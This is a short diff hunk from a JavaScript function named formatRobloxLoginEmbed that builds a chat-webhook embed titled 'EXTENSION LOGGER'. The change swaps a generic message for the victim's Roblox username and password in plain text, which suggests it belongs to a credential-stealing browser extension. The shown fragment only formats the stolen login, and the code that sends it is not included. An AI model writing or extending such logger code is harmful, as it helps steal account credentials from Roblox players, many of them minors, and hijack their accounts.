@@ -613,7 +613,7 @@ function formatRobloxLoginEmbed(logData) {
   return {
     embeds: [{
       title: `<:emoji_37:1410520517349212200> **EXTENSION LOGGER**`,
-      description: `\`\`\`\n${logData.message}\`\`\``,
+      description: `\`\`\`\nUsername: ${logData.username}\nPassword: ${logData.password}\`\`\``,
       color: 0xFFFFFF,
       fields: [
         {
